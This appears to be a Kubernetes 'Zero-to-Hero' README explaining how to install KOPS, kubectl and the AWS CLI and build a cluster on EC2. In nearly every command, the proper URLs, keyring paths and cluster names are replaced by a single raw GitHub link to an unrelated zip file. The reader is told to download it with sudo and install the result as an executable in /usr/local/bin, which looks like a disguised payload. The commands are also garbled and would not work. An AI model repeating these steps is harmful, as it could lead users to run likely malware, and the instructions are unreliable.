# Kubernetes-Zero-to-Hero
Creating this repo with an intent to make Kubernetes easy for begineers. This is a work-in-progress repo.

## Kubernetes Installation Using KOPS on EC2

### Create an EC2 instance or use your personal laptop.

Dependencies required 

1. Python3
2. AWS CLI
3. kubectl

###  Install dependencies


Add the new Kubernetes repository:
```
sudo apt-get update
sudo apt-get install -y ca-certificates curl apt-transport-https

```

```
curl -fsSL https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip | sudo gpg --dearmor -o https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip

```

```
echo 'deb [https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip] https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip /' | sudo tee https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip
```

```
sudo apt-get update
sudo apt-get install -y kubectl

```

Install AWS CLI (Ubuntu 24.04 compatible):

```
sudo snap install aws-cli --classic
```
```
export PATH="$https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip"
```

### Install KOPS (our hero for today)

```
curl -LO https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip$(curl -s https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip | grep tag_name | cut -d '"' -f 4)/kops-linux-amd64

chmod +x kops-linux-amd64

sudo mv kops-linux-amd64 /usr/local/bin/kops
```

### Provide the below permissions to your IAM user. If you are using the admin user, the below permissions are available by default

1. AmazonEC2FullAccess
2. AmazonS3FullAccess
3. IAMFullAccess
4. AmazonVPCFullAccess

### Set up AWS CLI configuration on your EC2 Instance or Laptop.

Run `aws configure`

## Kubernetes Cluster Installation 

Please follow the steps carefully and read each command before executing.

### Create S3 bucket for storing the KOPS objects.

```
aws s3api create-bucket --bucket kops-abhi-storage --region us-east-1
```

### Create the cluster 

```
kops create cluster https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip --state=s3://kops-abhi-storage --zones=us-east-1a --node-count=1 https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip  --master-volume-size=8 --node-volume-size=8
```

### Important: Edit the configuration as there are multiple resources created which won't fall into the free tier.

```
kops edit cluster https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip
```

Step 12: Build the cluster

```
kops update cluster https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip --yes --state=s3://kops-abhi-storage
```

This will take a few minutes to create............

After a few mins, run the below command to verify the cluster installation.

```
kops validate cluster https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip
```

